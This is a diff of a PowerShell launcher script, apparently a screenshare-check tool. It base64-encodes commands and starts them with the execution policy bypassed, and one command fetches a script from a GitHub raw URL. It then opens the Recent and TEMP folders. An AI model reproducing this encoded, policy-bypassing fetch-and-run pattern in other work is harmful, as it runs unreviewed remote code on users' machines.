@@ -4,15 +4,29 @@ $cmd3 = 'Invoke-RestMethod https://raw.githubusercontent.com/JavaXYZZ/ScreenShar
 
 function Start-Encoded {
     param($cmd)
-    $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
-    $encoded = [Convert]::ToBase64String($bytes)
-    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -EncodedCommand $encoded"
+
+    if ([string]::IsNullOrWhiteSpace($cmd)) {
+        Write-Host "Skipped empty command"
+        return
+    }
+
+    try {
+        $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+        $encoded = [Convert]::ToBase64String($bytes)
+
+        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -NoExit -EncodedCommand $encoded"
+    }
+    catch {
+        Write-Host "Failed to start command: $cmd"
+        Write-Host $_
+    }
 }
 
+# Run commands
 Start-Encoded $cmd1
 Start-Encoded $cmd2
 Start-Encoded $cmd3
-Start-Encoded $cmd4
 
+# Open folders
 Start-Process "shell:recent"
 Start-Process $env:TEMP
